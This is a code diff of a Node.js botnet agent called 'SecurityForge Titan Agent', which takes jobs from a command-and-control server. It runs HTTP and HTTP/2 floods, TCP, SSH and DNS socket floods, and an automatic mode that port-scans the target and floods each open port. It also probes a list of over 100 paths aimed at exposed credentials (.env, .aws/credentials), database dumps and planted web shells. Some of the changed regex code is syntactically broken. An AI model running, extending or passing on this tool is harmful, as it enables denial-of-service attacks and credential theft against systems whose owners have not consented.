@@ -1,10 +1,11 @@
 /**
- * SECURITYFORGE TITAN AGENT V44.1 (VORTEX ELITE PATCHED)
+ * SECURITYFORGE TITAN AGENT V44.0 (VORTEX ELITE)
  * 
  * [PATCH LOG]
- * - FIXED: Robots.txt Regex Syntax (Constructor Fix)
- * - FEATURE: Polyglot Path Mutator (php, asp, jsp, txt)
- * - FEATURE: Aggressive Open Port Logger
+ * - FIXED: Regex Syntax Error (Switched to Constructor)
+ * - FEATURE: Recursive Sitemap & Robots.txt Parser
+ * - FEATURE: Expanded Dictionary (100+ Paths)
+ * - FEATURE: Explicit Port/IP Logging
  */
 
 const https = require('https');
@@ -78,16 +79,32 @@ const HTTP2_HEADERS = {
     'User-Agent': USER_AGENTS[0]
 };
 
-// DYNAMIC MUTATION BASE PATHS
-const BASE_PATHS = [
-    '/.env', '/config', '/admin', '/backup', '/db', '/database', '/dump', '/users', 
-    '/login', '/wp-admin', '/dashboard', '/panel', '/shell', '/upload', '/api',
-    '/server-status', '/phpinfo', '/test', '/console', '/web-console', '/jmx-console',
-    '/jenkins', '/grafana', '/kibana', '/prometheus', '/actuator', '/metrics',
-    '/.git/config', '/.aws/credentials', '/sftp-config.json'
+// EXPANDED DICTIONARY (100+ High Value Targets)
+const DEEP_ADMIN_PATHS = [
+    // Core Configs
+    '/.env', '/.env.save', '/.env.example', '/.env.local', '/.env.production',
+    '/config.php', '/config.json', '/config.yml', '/web.config', '/sftp-config.json',
+    '/docker-compose.yml', '/package.json', '/composer.json', '/secrets.yml',
+    '/.git/config', '/.git/HEAD', '/.vscode/sftp.json',
+    // Backups & Dumps
+    '/backup.sql', '/database.sql', '/dump.sql', '/data.sql', '/users.sql',
+    '/backup.zip', '/www.zip', '/site.zip', '/html.zip', '/logs.zip',
+    '/access.log', '/error.log', '/debug.log', '/npm-debug.log',
+    // Admin Panels
+    '/admin', '/administrator', '/admin_panel', '/controlpanel', '/cpanel',
+    '/wp-admin', '/wp-login.php', '/typo3', '/cms', '/login',
+    '/phpmyadmin', '/adminer.php', '/pma', '/dbadmin', '/sqladmin',
+    '/dashboard', '/user/login', '/auth/login', '/manage', '/manager',
+    // Dev Tools
+    '/api/health', '/telescope', '/horizon', '/jenkins', '/grafana', '/kibana',
+    '/zabbix', '/prometheus', '/metrics', '/actuator/health', '/server-status',
+    '/info.php', '/phpinfo.php', '/test.php', '/_profiler',
+    // Cloud Specific
+    '/aws/credentials', '/.aws/credentials', '/storage/logs/laravel.log',
+    // Shells
+    '/shell.php', '/cmd.php', '/root.php', '/1.php', '/x.php', '/upl.php',
+    '/upload.php', '/api/upload', '/v1/upload'
 ];
-
-const EXTENSIONS = ['', '.php', '.html', '.json', '.xml', '.sql', '.zip', '.tar.gz', '.bak', '.old', '.save', '.txt'];
 
 // ==========================================
 // 3. UTILITIES
@@ -157,6 +174,7 @@ const runHttpFlood = (job, target) => {
         }
         
         const cb = job.use_chaos ? `?_=${Math.random().toString(36).slice(2)}` : '';
+        const startTime = Date.now();
         
         const req = lib.request({
             host: target.host,
@@ -167,6 +185,11 @@ const runHttpFlood = (job, target) => {
             rejectUnauthorized: false,
             headers: HTTP1_HEADERS
         }, (res) => {
+            const latency = Date.now() - startTime;
+            STATE.stats.latencySum += latency;
+            STATE.stats.latencyCount++;
+            STATE.stats.maxLatency = Math.max(STATE.stats.maxLatency, latency);
+            
             STATE.stats.success++;
             res.resume();
             if (STATE.running) setImmediate(attack);
@@ -191,8 +214,14 @@ const runHttp2Flood = (job, target) => {
             for (let i=0; i<50; i++) {
                 if (client.destroyed) break;
                 try {
+                    const startTime = Date.now();
                     const req = client.request({ ':path': target.path, ':method': job.method, ...HTTP2_HEADERS });
-                    req.on('response', () => STATE.stats.success++);
+                    req.on('response', () => {
+                        const latency = Date.now() - startTime;
+                        STATE.stats.latencySum += latency;
+                        STATE.stats.latencyCount++;
+                        STATE.stats.success++;
+                    });
                     req.on('error', () => {});
                     req.end();
                 } catch { STATE.stats.failed++; client.destroy(); break; }
@@ -224,7 +253,11 @@ const runSocketStress = (job, target, type, portOverride = null) => {
             if (!STATE.running) return;
             const s = new net.Socket();
             s.setTimeout(500);
+            const start = Date.now();
             s.connect(port, dest, () => { 
+                const lat = Date.now() - start;
+                STATE.stats.latencySum += lat;
+                STATE.stats.latencyCount++;
                 STATE.stats.success++; 
                 s.write(BUFFERS.JUNK);
                 s.destroy(); 
@@ -254,36 +287,37 @@ const fetchPath = (target, path) => {
 const runSpider = async (target) => {
     if (!STATE.running) return;
     
-    // 1. Check Robots.txt (FIXED REGEX)
+    // 1. Check Robots.txt
     log('SPIDER: Checking robots.txt...', 'INFO');
     const robots = await fetchPath(target, '/robots.txt');
-    // Using RegExp constructor to avoid escape issues in template string
-    const robotsRegex = new RegExp("Disallow: (\\S+)", "g");
-    let robotMatch;
-    while ((robotMatch = robotsRegex.exec(robots)) !== null) {
-        const p = robotMatch[1].trim();
-        if (p && !STATE.dynamicPaths.includes(p)) {
-            STATE.dynamicPaths.push(p);
-            log(`SPIDER: Hidden path (robots.txt): ${p}`, 'FOUND');
-        }
+    const disallowed = robots.match(/Disallow: (/S+)/g);
+    if (disallowed) {
+        disallowed.forEach(line => {
+            const p = line.split(' ')[1].trim();
+            if (p && !STATE.dynamicPaths.includes(p)) {
+                STATE.dynamicPaths.push(p);
+                log(`SPIDER: Found hidden path in robots.txt: ${p}`, 'FOUND');
+            }
+        });
     }
 
     // 2. Check Sitemap
     const sitemap = await fetchPath(target, '/sitemap.xml');
-    const locRegex = new RegExp("<loc>(.*?)<\\/loc>", "g");
-    let locMatch;
-    while ((locMatch = locRegex.exec(sitemap)) !== null) {
-        try {
-            const u = new URL(locMatch[1]);
-            if (!STATE.dynamicPaths.includes(u.pathname)) {
-                STATE.dynamicPaths.push(u.pathname);
-                log(`SPIDER: Found via Sitemap: ${u.pathname}`, 'FOUND');
-            }
-        } catch {}
+    const locs = sitemap.match(/<loc>(.*?)</loc>/g);
+    if (locs) {
+        log(`SPIDER: Parsed ${locs.length} URLs from sitemap`, 'INFO');
+        locs.forEach(l => {
+            const url = l.replace(/</?loc>/g, '');
+            try {
+                const u = new URL(url);
+                if (!STATE.dynamicPaths.includes(u.pathname)) STATE.dynamicPaths.push(u.pathname);
+            } catch {}
+        });
     }
 
-    // 3. Scan DOM
+    // 3. Scan Main Page for links (Regex Constructor Fix)
     const body = await fetchPath(target, target.path);
+    // Safe Regex construction for deployment
     const linkRegex = new RegExp('(?:href|src|action)=["\'](\/[^"\']+)["\']', 'g');
     let match;
     let count = 0;
@@ -294,38 +328,26 @@ const runSpider = async (target) => {
             count++;
         }
     }
+    if (count > 0) log(`SPIDER: Extracted ${count} paths from DOM.`, 'INFO');
     
-    if (STATE.running) setTimeout(() => runSpider(target), 15000);
+    if (STATE.running) setTimeout(() => runSpider(target), 10000);
 };
 
 const runAdminHunter = (target) => {
     if (!STATE.running) return;
     const lib = target.isSsl ? https : http;
-    
-    // Dynamic Mutation Generator
-    const generateMutations = function* () {
-        for (const base of BASE_PATHS) {
-            for (const ext of EXTENSIONS) {
-                yield `${base}${ext}`;
-            }
-        }
-    };
-    
-    const iterator = generateMutations();
-    
+    let pathIdx = 0;
+
     const crawl = () => {
-        if (!STATE.running) return;
-        
-        for(let i=0; i<10; i++) {
-            const next = iterator.next();
-            if (next.done) return;
-            
-            const path = next.value;
+        if (!STATE.running || pathIdx >= DEEP_ADMIN_PATHS.length) return;
+        // High concurrency scan
+        for(let i=0; i<8 && pathIdx < DEEP_ADMIN_PATHS.length; i++) {
+            const path = DEEP_ADMIN_PATHS[pathIdx++];
             const req = lib.get({
                 host: target.host, port: target.port, path: path, rejectUnauthorized: false, headers: HTTP1_HEADERS
             }, (res) => {
-                if (res.statusCode < 404 || res.statusCode === 200 || res.statusCode === 401 || res.statusCode === 403) {
-                    const msg = `HUNTER: FOUND ${path} [${res.statusCode}]`;
+                if (res.statusCode < 404 || res.statusCode === 401 || res.statusCode === 403 || res.statusCode === 200) {
+                    const msg = `HUNTER: FOUND ${path} [Code: ${res.statusCode}]`;
                     if(!STATE.discovered.has(msg)) { 
                         STATE.discovered.add(msg); 
                         log(msg, 'FOUND'); 
@@ -348,30 +370,24 @@ const runVortex = (job, target) => {
             STATE.resolvedIp = addresses[0];
             const msg = `VORTEX: LOCKED ON IP ${STATE.resolvedIp}`;
             log(msg, 'SUCCESS');
-            STATE.priorityLogs.push(msg); 
+            STATE.priorityLogs.push(msg); // Ensure IP is visible in UI
 
-            // Expanded Port List
-            const deathPorts = [
-                20, 21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995,
-                1433, 3306, 3389, 5432, 5900, 6379, 8000, 8080, 8443, 9200, 11211, 27017
-            ];
-            
+            const deathPorts = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 1433, 3306, 3389, 5432, 5900, 8000, 8080, 8443, 27017, 6379, 11211];
             log(`VORTEX: Scanning ${deathPorts.length} vectors on ${STATE.resolvedIp}...`, 'INFO');
             
             deathPorts.forEach(port => {
                 const s = new net.Socket();
-                s.setTimeout(3000);
+                s.setTimeout(2500);
                 s.connect(port, STATE.resolvedIp, () => {
-                    // Distinct Log for Open Ports
-                    const openMsg = `[OPEN] ${STATE.resolvedIp}:${port}`;
+                    const openMsg = `[OPEN] IP:${STATE.resolvedIp} PORT:${port}`;
                     if(!STATE.discovered.has(openMsg)) {
                         STATE.discovered.add(openMsg);
-                        log(openMsg, 'SUCCESS'); 
+                        log(openMsg, 'OPEN');
                         
                         // AUTO-ATTACK
                         const attackType = (port === 53) ? 'DNS' : (port === 22) ? 'SSH' : 'TCP';
                         log(`VORTEX: Engaging ${attackType} Flood on Port ${port}`, 'warning');
-                        for(let k=0; k<40; k++) runSocketStress(job, target, attackType, port);
+                        for(let k=0; k<30; k++) runSocketStress(job, target, attackType, port);
                     }
                     s.destroy();
                 });
@@ -396,15 +412,16 @@ const startJob = (job) => {
     STATE.dynamicPaths = [];
     STATE.resolvedIp = null;
     
-    log(`TITAN V44.1 | TARGET: ${job.target} | METHOD: ${job.method}`);
+    log(`TITAN V44.0 | TARGET: ${job.target} | METHOD: ${job.method}`);
     const target = getTargetDetails(job.target);
     if (!target) return;
 
+    // Recon Phase
     if (job.use_100_percent_death) {
         log('WARNING: 100% DEATH (VORTEX) MODE ENGAGED.', 'warning');
-        runVortex(job, target); 
-        runSpider(target);      
-        runAdminHunter(target); 
+        runVortex(job, target); // IP + Port + Attack
+        runSpider(target);      // Robots + Sitemap + DOM
+        runAdminHunter(target); // Deep Dict
     } else {
         if (job.use_admin_hunter || job.use_osint_recon) {
             runSpider(target);
@@ -412,6 +429,7 @@ const startJob = (job) => {
         }
     }
 
+    // Main Attack Phase
     const threads = Math.min(job.concurrency || 50, 500);
     for (let i = 0; i < threads; i++) {
         if (job.use_syn_flood) runSocketStress(job, target, 'TCP');
@@ -426,6 +444,7 @@ const stopJob = () => {
     log("ENGINE STOPPED");
 };
 
+// Heartbeat
 setInterval(() => {
     const now = Date.now();
     if (now - STATE.lastHeartbeat > C2_CONFIG.heartbeatInterval) {
@@ -433,12 +452,13 @@ setInterval(() => {
             node_id: NODE_ID,
             last_seen: new Date().toISOString(),
             ip: STATE.resolvedIp || 'unknown',
-            version: 'V44.1'
+            version: 'V44.0'
         }, { 'Prefer': 'resolution=merge-duplicates' }).catch(() => {});
         STATE.lastHeartbeat = now;
     }
 }, 5000);
 
+// Command Polling
 setInterval(async () => {
     if (STATE.running && STATE.activeJob) {
         const now = Date.now();
@@ -483,5 +503,5 @@ setInterval(async () => {
     }
 }, C2_CONFIG.pollInterval);
 
-http.createServer((req, res) => res.end('Titan V44.1 Online')).listen(process.env.PORT || 3000);
-console.log('SecurityForge Titan Agent V44.1 (Vortex Elite Patched) Online | ID: ' + NODE_ID);
+http.createServer((req, res) => res.end('Titan V44.0 Online')).listen(process.env.PORT || 3000);
+console.log('SecurityForge Titan Agent V44.0 (Vortex Elite) Online | ID: ' + NODE_ID);
